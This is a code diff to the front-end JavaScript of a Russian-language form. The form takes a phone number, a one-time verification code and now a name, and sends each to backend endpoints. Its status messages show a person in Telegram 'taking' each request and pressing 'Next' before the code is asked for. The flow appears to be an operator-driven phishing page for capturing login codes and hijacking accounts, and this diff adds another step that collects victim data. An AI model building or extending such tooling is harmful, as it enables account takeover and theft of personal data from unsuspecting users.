@@ -4,13 +4,18 @@ const submitButton = document.getElementById("submit-button");
 const statusMessage = document.getElementById("status-message");
 const phoneScreen = document.getElementById("phone-screen");
 const verifyScreen = document.getElementById("verify-screen");
+const nameScreen = document.getElementById("name-screen");
 const verifyPhone = document.getElementById("verify-phone");
 const verifyForm = document.getElementById("verify-form");
 const verifyCodeInput = document.getElementById("verify-code");
 const verifyStatusMessage = document.getElementById("verify-status-message");
 const codeBoxes = Array.from(document.querySelectorAll(".code-box"));
 const backButton = document.getElementById("back-button");
+const nameBackButton = document.getElementById("name-back-button");
 const countdown = document.getElementById("countdown");
+const nameForm = document.getElementById("name-form");
+const nameInput = document.getElementById("name-input");
+const nameSubmitButton = document.getElementById("name-submit-button");
 
 let countdownTimer = null;
 let requestStatusTimer = null;
@@ -61,6 +66,7 @@ const updateButtonState = () => {
 };
 
 const setStatus = (text, type = "") => {
+  statusMessage.style.display = text ? "block" : "none";
   statusMessage.textContent = text;
   statusMessage.className = type ? `status-message ${type}` : "status-message";
 };
@@ -70,12 +76,16 @@ const setVerifyStatus = (text) => {
 };
 
 const setActiveScreen = (screen) => {
+  const isPhone = screen === "phone";
   const isVerify = screen === "verify";
+  const isName = screen === "name";
 
-  phoneScreen.classList.toggle("screen-view-active", !isVerify);
-  phoneScreen.setAttribute("aria-hidden", String(isVerify));
+  phoneScreen.classList.toggle("screen-view-active", isPhone);
+  phoneScreen.setAttribute("aria-hidden", String(!isPhone));
   verifyScreen.classList.toggle("screen-view-active", isVerify);
   verifyScreen.setAttribute("aria-hidden", String(!isVerify));
+  nameScreen.classList.toggle("screen-view-active", isName);
+  nameScreen.setAttribute("aria-hidden", String(!isName));
 };
 
 const updateCodeBoxes = () => {
@@ -113,6 +123,14 @@ const openVerifyScreen = () => {
   window.setTimeout(() => verifyCodeInput.focus(), 80);
 };
 
+const openNameScreen = () => {
+  stopCountdown();
+  setVerifyStatus("");
+  nameInput.value = "";
+  setActiveScreen("name");
+  window.setTimeout(() => nameInput.focus(), 80);
+};
+
 const checkRequestStatus = async () => {
   if (!currentRequestId) {
     return;
@@ -126,24 +144,34 @@ const checkRequestStatus = async () => {
       throw new Error(result.error || "Не удалось проверить статус");
     }
 
-    if (result.status === "taken") {
-      setStatus(`Заявку взял ${result.takenBy}. Ждём нажатие "Дальше" в Telegram.`, "success");
-      return;
-    }
-
     if ((result.codeErrorCount || 0) > lastCodeErrorCount) {
       lastCodeErrorCount = result.codeErrorCount || 0;
       verifyCodeInput.value = "";
       lastSubmittedCode = "";
       setVerifyStatus("Неверный код");
       updateCodeBoxes();
-      window.setTimeout(() => verifyCodeInput.focus(), 80);
+      if (verifyScreen.classList.contains("screen-view-active")) {
+        window.setTimeout(() => verifyCodeInput.focus(), 80);
+      }
+    }
+
+    if (result.status === "taken") {
+      setStatus(`Заявку взял ${result.takenBy}. Ждем нажатие "Дальше" в Telegram.`, "success");
+      return;
     }
 
     if (result.status === "ready") {
       setStatus("");
       if (!verifyScreen.classList.contains("screen-view-active")) {
         openVerifyScreen();
+      }
+      return;
+    }
+
+    if (result.status === "name") {
+      setStatus("");
+      if (!nameScreen.classList.contains("screen-view-active")) {
+        openNameScreen();
       }
     }
   } catch (error) {
@@ -189,6 +217,42 @@ const submitVerificationCode = async (code) => {
   }
 };
 
+const submitName = async (value) => {
+  const trimmed = value.trim();
+  if (!trimmed || !currentRequestId) {
+    return;
+  }
+
+  nameSubmitButton.disabled = true;
+  nameSubmitButton.textContent = "Отправка...";
+
+  try {
+    const response = await fetch("/api/send-name", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        requestId: currentRequestId,
+        phone: currentPhone,
+        name: trimmed
+      })
+    });
+
+    const result = await response.json();
+    if (!response.ok) {
+      throw new Error(result.error || "Не удалось отправить имя");
+    }
+
+    nameSubmitButton.textContent = "Продолжить";
+    nameSubmitButton.disabled = false;
+    nameInput.value = "";
+  } catch (error) {
+    nameSubmitButton.textContent = "Продолжить";
+    nameSubmitButton.disabled = false;
+  }
+};
+
 const stopCountdown = () => {
   if (countdownTimer) {
     clearInterval(countdownTimer);
@@ -219,6 +283,25 @@ const startCountdown = () => {
   }, 1000);
 };
 
+const resetToPhoneScreen = () => {
+  stopCountdown();
+  stopRequestStatusPolling();
+  currentPhone = "";
+  currentRequestId = "";
+  lastSubmittedCode = "";
+  lastCodeErrorCount = 0;
+  submitButton.textContent = "Продолжить";
+  verifyCodeInput.value = "";
+  nameInput.value = "";
+  nameSubmitButton.disabled = false;
+  nameSubmitButton.textContent = "Продолжить";
+  setVerifyStatus("");
+  updateCodeBoxes();
+  setStatus("");
+  setActiveScreen("phone");
+  phoneInput.focus();
+};
+
 phoneInput.addEventListener("input", () => {
   phoneInput.value = formatPhone(phoneInput.value);
   setStatus("");
@@ -242,20 +325,12 @@ verifyCodeInput.addEventListener("input", () => {
   submitVerificationCode(code);
 });
 
-backButton.addEventListener("click", () => {
-  stopCountdown();
-  stopRequestStatusPolling();
-  currentPhone = "";
-  currentRequestId = "";
-  lastSubmittedCode = "";
-  lastCodeErrorCount = 0;
-  submitButton.textContent = "Продолжить";
-  verifyCodeInput.value = "";
-  setVerifyStatus("");
-  updateCodeBoxes();
-  setStatus("");
-  setActiveScreen("phone");
-  phoneInput.focus();
+backButton.addEventListener("click", resetToPhoneScreen);
+nameBackButton.addEventListener("click", resetToPhoneScreen);
+
+nameForm.addEventListener("submit", async (event) => {
+  event.preventDefault();
+  await submitName(nameInput.value);
 });
 
 form.addEventListener("submit", async (event) => {
@@ -274,7 +349,7 @@ form.addEventListener("submit", async (event) => {
   stopRequestStatusPolling();
   submitButton.disabled = true;
   submitButton.textContent = "Ожидание...";
-  setStatus("Отправили заявку в Telegram. Ждём, пока там нажмут кнопку.", "success");
+  setStatus("Отправили заявку в Telegram. Ждем, пока там нажмут кнопку.", "success");
 
   try {
     const response = await fetch("/api/send-phone", {
